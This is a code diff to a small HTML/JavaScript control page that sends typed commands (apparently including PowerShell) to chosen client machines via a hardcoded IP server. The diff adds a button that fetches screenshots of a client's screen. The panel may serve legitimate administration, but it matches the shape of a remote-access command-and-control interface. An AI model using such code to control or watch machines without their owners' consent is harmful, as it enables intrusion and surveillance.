@@ -11,7 +11,7 @@
                 return false;
             }
         };
-        function query(data, callback) {
+        function getUrl(data) {
             let url = "http://3.89.196.174:6702/?";
             let arr = [];
             for (let prop in data) {
@@ -20,6 +20,10 @@
                 }
             }
             url += arr.join("&");
+            return url;
+        }
+        function query(data, callback) {
+            let url = getUrl(data);
             console.log(url);
             let xhr = new XMLHttpRequest();
             xhr.open("GET", url);
@@ -62,6 +66,16 @@
                     document.querySelector("#result").innerText = result;
                 });
             };
+            document.querySelector("#screenshot").onclick = function() {
+                let e = document.querySelector("#client");
+                let mac = e.options[e.selectedIndex].value;
+                let img = document.createElement("img");
+                img.src = getUrl({
+                    mac: mac,
+                    screenshot: ""
+                });
+                document.querySelector("#result").appendChild(img);
+            }
         }
     </script>
 </head>
@@ -69,7 +83,7 @@
 <label for="client">Select client: </label><select id="client"></select><br>
 <label for="command">Command: </label><textarea id="command"></textarea><br>
 <label for="is_psl">Is PSL? </label><input type="checkbox" id="is_psl"><br>
-<label for="result">Result: </label><pre style="border: 1px solid black" id="result"></pre><br>
-<button id="send">Send</button>
+<button id="send">Send</button><button id="screenshot">Screenshot</button><br>
+<label for="result">Result: </label><pre style="border: 1px solid black" id="result"></pre>
 </body>
 </html>
